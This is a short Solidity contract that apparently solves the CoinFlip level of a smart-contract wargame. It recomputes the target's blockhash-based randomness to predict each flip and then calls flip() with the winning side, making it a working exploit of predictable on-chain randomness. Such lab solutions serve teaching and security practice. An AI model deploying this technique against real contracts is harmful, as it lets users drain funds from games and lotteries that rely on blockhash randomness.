// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../lv03_coinflip.sol';

contract CoinFlipSolver {

  address public owner;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner, "Caller is not the owner");
    _;
  }

  function solveFlip(address target) public onlyOwner returns (bool, bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    CoinFlip coinFlipTarget = CoinFlip(target);
    return (side, coinFlipTarget.flip(side));
  }
}